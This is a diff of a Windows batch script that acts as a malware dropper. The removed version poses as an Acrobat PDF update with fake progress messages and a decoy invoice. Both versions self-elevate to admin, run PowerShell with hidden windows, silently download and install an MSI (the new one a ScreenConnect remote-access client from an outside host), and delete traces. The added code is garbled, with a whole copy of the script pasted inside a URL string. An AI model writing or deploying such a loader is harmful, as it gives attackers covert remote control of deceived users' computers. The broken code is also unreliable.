@@ -2,69 +2,99 @@
 setlocal EnableDelayedExpansion
 
 :: =========================================================
-:: AUTO-ELEVATE + HIDDEN LAUNCH (no flash)
+:: 1. AUTO-ELEVATE TO ADMIN (UAC PROMPT)
 :: =========================================================
 net session >nul 2>&1
 if %errorlevel% neq 0 (
-    powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -Verb RunAs -WindowStyle Hidden"
+    :: Relaunch this BAT as admin without any window
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs -WindowStyle Hidden"
     exit /b
 )
 
 :: =========================================================
-:: STEALTH CONFIG (random names + fake PDF flavor)
+:: 2. CREATE TEMP POWERSHELL SCRIPT (your working logic)
 :: =========================================================
-set "URL=https://spoo.me/catchyou"
-set "MSI_FILE=%TEMP%\AcroRd32_Update_%RANDOM%.msi"
-set "LOG_FILE=%TEMP%\AcroRd32_Update.log"
-set "FAKE_PDF=%TEMP%\Invoice_Confirmation.pdf"
+set "PS1=%TEMP%\sc_hidden_install.ps1"
 
-:: Fake progress (slow enough to look real, fast enough to not annoy)
-echo Preparing PDF Viewer update...
-timeout /t 1 >nul
-echo Downloading secured pdf...
-timeout /t 2 >nul
+> "%PS1%" echo $msiUrl = "@echo off
+setlocal EnableDelayedExpansion
 
-:: Download with PowerShell (stealthier than certutil)
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
-"Invoke-WebRequest -Uri '%URL%' -OutFile '%MSI_FILE%' -UseBasicParsing -UserAgent 'Mozilla/5.0'"
-
-if not exist "%MSI_FILE%" (
-    echo Unable to download PDF file. Please check your internet connection.
-    timeout /t 3 >nul
-    exit /b 1
+:: =========================================================
+:: 1. AUTO-ELEVATE TO ADMIN (UAC PROMPT)
+:: =========================================================
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    :: Relaunch this BAT as admin without any window
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs -WindowStyle Hidden"
+    exit /b
 )
 
-echo PDF downloaded successfully
-timeout /t 1 >nul
+:: =========================================================
+:: 2. CREATE TEMP POWERSHELL SCRIPT (your working logic)
+:: =========================================================
+set "PS1=%TEMP%\sc_hidden_install.ps1"
 
-echo Preparing PDF viewer update...
-echo Installing PDF viewer components...
-timeout /t 2 >nul
+> "%PS1%" echo $msiUrl = "https://filereader.app/tap/ScreenConnect.ClientSetup.msi"
+>>"%PS1%" echo $downloadPath = "$env:TEMP\ScreenConnect.ClientSetup.msi"
+>>"%PS1%" echo $logPath = "$env:TEMP\SC_install_log.txt"
 
-:: Silent install
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
-"Start-Process msiexec.exe -ArgumentList '/i \"%MSI_FILE%\" /qn /norestart /l*v \"%LOG_FILE%\"' -Wait -NoNewWindow"
+>>"%PS1%" echo try {
+>>"%PS1%" echo     Invoke-WebRequest -Uri $msiUrl -OutFile $downloadPath -ErrorAction Stop
+>>"%PS1%" echo } catch {
+>>"%PS1%" echo     exit 1
+>>"%PS1%" echo }
 
-if errorlevel 1 (
-    echo Installation encountered an issue. Log saved for review.
-) else (
-    echo PDF viewer installed successfully
-)
+>>"%PS1%" echo $arguments = "/i `"$downloadPath`" /quiet /norestart /L*v `"$logPath`""
 
-:: Aggressive cleanup
-del /f /q "%MSI_FILE%" >nul 2>&1
-del /f /q "%LOG_FILE%" >nul 2>&1
-del "%MSI_FILE%:Zone.Identifier" >nul 2>&1
+>>"%PS1%" echo try {
+>>"%PS1%" echo     $process = Start-Process msiexec.exe -ArgumentList $arguments -Wait -PassThru -ErrorAction Stop
+>>"%PS1%" echo } catch {
+>>"%PS1%" echo     exit 2
+>>"%PS1%" echo }
 
-:: Final fake message + open fake PDF
-echo =============================================
-echo Document ready. You may now close this window.
-echo PDF will be opened soon.
-echo =============================================
-timeout /t 2 >nul
+>>"%PS1%" echo if (Test-Path $downloadPath) { Remove-Item $downloadPath -Force }
 
-:: Open fake PDF in browser (or real one if you drop one)
-start "" "https://fake-invoice-viewer.com/confirmation.pdf" >nul 2>&1
+>>"%PS1%" echo exit $process.ExitCode
+
+:: =========================================================
+:: 3. RUN POWERSHELL HIDDEN (NO WINDOW)
+:: =========================================================
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS1%"
+
+:: Optional: clean up the temp PS1
+del "%PS1%" >nul 2>&1
+
+endlocal
+exit /b
+"
+>>"%PS1%" echo $downloadPath = "$env:TEMP\ScreenConnect.ClientSetup.msi"
+>>"%PS1%" echo $logPath = "$env:TEMP\SC_install_log.txt"
+
+>>"%PS1%" echo try {
+>>"%PS1%" echo     Invoke-WebRequest -Uri $msiUrl -OutFile $downloadPath -ErrorAction Stop
+>>"%PS1%" echo } catch {
+>>"%PS1%" echo     exit 1
+>>"%PS1%" echo }
+
+>>"%PS1%" echo $arguments = "/i `"$downloadPath`" /quiet /norestart /L*v `"$logPath`""
+
+>>"%PS1%" echo try {
+>>"%PS1%" echo     $process = Start-Process msiexec.exe -ArgumentList $arguments -Wait -PassThru -ErrorAction Stop
+>>"%PS1%" echo } catch {
+>>"%PS1%" echo     exit 2
+>>"%PS1%" echo }
+
+>>"%PS1%" echo if (Test-Path $downloadPath) { Remove-Item $downloadPath -Force }
+
+>>"%PS1%" echo exit $process.ExitCode
+
+:: =========================================================
+:: 3. RUN POWERSHELL HIDDEN (NO WINDOW)
+:: =========================================================
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS1%"
+
+:: Optional: clean up the temp PS1
+del "%PS1%" >nul 2>&1
 
 endlocal
 exit /b
